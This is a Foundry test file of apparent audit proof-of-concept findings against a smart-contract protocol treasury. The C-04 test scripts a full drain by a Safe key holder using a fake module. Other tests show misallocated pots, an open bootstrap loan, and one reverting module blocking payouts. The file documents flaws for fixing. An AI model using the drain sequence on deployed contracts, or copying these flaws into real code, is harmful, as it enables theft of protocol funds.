// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {ListingRegistry} from "../../../src/ListingRegistry.sol";
import {ProtocolTreasury} from "../../../src/floor/ProtocolTreasury.sol";
import {FloorModule} from "../../../src/floor/FloorModule.sol";

/// A module that accepts whatever the treasury sends and reports a volume. `honest` stands in for the real FloorModule's
/// funding entry points (reserve and float both accepted); the attacker's is the same code, deployed by the Safe's holder.
contract StubModule {
    address public treasury;
    uint256 public vol;
    bool public revertReserve;
    uint256 public floats;
    uint256 public reserves;
    constructor(address t, uint256 v) { treasury = t; vol = v; }
    function volume7d() external view returns (uint256) { return vol; }
    function fundReserve() external payable { require(!revertReserve, "reserve refused"); reserves += msg.value; }
    function fundFloat() external payable returns (uint256) { floats += msg.value; return msg.value; }
    function setRevertReserve(bool b) external { revertReserve = b; }
    function sweep(address to) external { (bool ok,) = to.call{value: address(this).balance}(""); require(ok); }
}

contract C_ProtocolTreasuryPoC is Test {
    address safe = makeAddr("safe (2-of-2)");
    address eoaTreasury = makeAddr("registry treasury EOA");
    address ops = makeAddr("ops");
    address attacker = makeAddr("holder of both devices");
    ListingRegistry registry;
    ProtocolTreasury t;
    StubModule module;

    function setUp() public {
        registry = new ListingRegistry(safe, eoaTreasury);
        t = new ProtocolTreasury(registry);
        module = new StubModule(address(t), 1 ether);
    }

    function _income(uint256 amount) internal {
        vm.deal(address(this), amount);
        (bool ok,) = address(t).call{value: amount}("");
        require(ok);
    }

    // ------------------------------------------------------------------------------------------------------------------------
    // C-04: the Safe (anyone holding both devices) drains the WHOLE treasury at once, including the pots already allocated to
    // reserves, floats and bootstrap — not only "income and the unallocated balance" as the Trust page says.
    // ------------------------------------------------------------------------------------------------------------------------
    function test_C04_theSafeTakesEveryPotNotOnlyUnallocated() public {
        vm.startPrank(safe);
        t.addCollection(FloorModule(payable(address(module))));
        t.setOps(ops);
        vm.stopPrank();
        _income(10 ether);
        t.allocate(); // 40/30/20/10 by default: 4 reserves, 3 floats, 2 bootstrap, 1 to ops
        _income(5 ether); // fresh, unallocated income
        uint256 inContract = address(t).balance;
        assertEq(inContract, 14 ether);
        assertEq(t.reservesPot() + t.floatsPot() + t.bootstrapPot(), 9 ether, "9 ETH already allocated to pots");

        // the attacker, holding both devices, as the Safe, with no delay at any step:
        vm.startPrank(safe);
        StubModule fake = new StubModule(address(t), type(uint128).max); // names this treasury, reports a huge volume
        t.addCollection(FloorModule(payable(address(fake))));
        t.setShares(0, 0, 0, 10_000);
        t.setOps(attacker);
        t.setBootstrapLoan(type(uint256).max);
        vm.stopPrank();
        t.allocate(); // unallocated -> attacker
        t.distribute(); // reserves and floats pots -> ~all to the fake module by weight
        t.bootstrap(FloorModule(payable(address(fake)))); // the bootstrap pot -> the fake module
        fake.sweep(attacker);

        assertApproxEqAbs(attacker.balance, 14 ether, 1e9, "everything but rounding dust");
        assertLt(address(t).balance, 1e9, "the treasury is empty (dust only)");
        emit log_named_uint("taken by the attacker (wei)", attacker.balance);
    }

    // ------------------------------------------------------------------------------------------------------------------------
    // C-05: income that arrives before the Safe's setShares(9000,0,0,1000) / setBootstrapLoan(0) (go-live step 7, the last
    // bullet; no script prints or checks it) is allocated at the default 40/30/20/10. The floats pot keeps funding floats
    // (an OFF path) after the shares are set, and the bootstrap pot is stranded for as long as the loan is 0.
    // ------------------------------------------------------------------------------------------------------------------------
    function test_C05_preSetSharesIncomeKeepsTheOffPathsAlive() public {
        vm.prank(safe);
        t.addCollection(FloorModule(payable(address(module))));
        // a permissionless sweep-only launch trades before step 7: the curve's platform share arrives here, anyone allocates
        _income(1 ether);
        t.allocate();
        assertEq(t.floatsPot(), 0.3 ether);
        assertEq(t.bootstrapPot(), 0.2 ether);

        // step 7, as written
        vm.startPrank(safe);
        t.setShares(9_000, 0, 0, 1_000);
        t.setBootstrapLoan(0);
        vm.stopPrank();

        // the floats pot is still paid out as floats: Phase 1's "floats OFF" does not hold
        t.distribute();
        assertEq(module.floats(), 0.3 ether, "a float was funded after floats were switched off");
        // the bootstrap pot has no way out while the loan is 0
        vm.expectRevert(ProtocolTreasury.NothingToDo.selector);
        t.bootstrap(FloorModule(payable(address(module))));
        assertEq(t.bootstrapPot(), 0.2 ether, "stranded");
        // and it is not unallocated income either: allocate cannot re-split it
        assertEq(t.unallocated(), 0);
    }

    /// C-05 (b): at defaults (the step skipped), anyone takes the 'OFF' bootstrap loan for a registered collection.
    function test_C05b_defaultsLetAnyoneOpenABootstrapLoan() public {
        vm.prank(safe);
        t.addCollection(FloorModule(payable(address(module))));
        _income(20 ether);
        t.allocate();
        vm.prank(makeAddr("anyone"));
        t.bootstrap(FloorModule(payable(address(module))));
        assertEq(t.outstanding(address(module)), 2 ether, "a 2 ETH loan, half of it a float");
        assertEq(module.floats(), 1 ether);
    }

    // ------------------------------------------------------------------------------------------------------------------------
    // C-10 (informational): the NatSpec says a module whose fundReserve reverts "stays in the pot; the others are paid".
    // It does not: fundReserve is called without try, so one such module blocks distribute for every collection.
    // ------------------------------------------------------------------------------------------------------------------------
    function test_C10_oneRevertingModuleBlocksDistributeForAll() public {
        StubModule other = new StubModule(address(t), 1 ether);
        vm.startPrank(safe);
        t.addCollection(FloorModule(payable(address(module))));
        t.addCollection(FloorModule(payable(address(other))));
        vm.stopPrank();
        _income(1 ether);
        t.allocate();
        other.setRevertReserve(true);
        vm.expectRevert(bytes("reserve refused"));
        t.distribute();
        assertEq(module.reserves(), 0, "the healthy module was not paid either");
    }
}
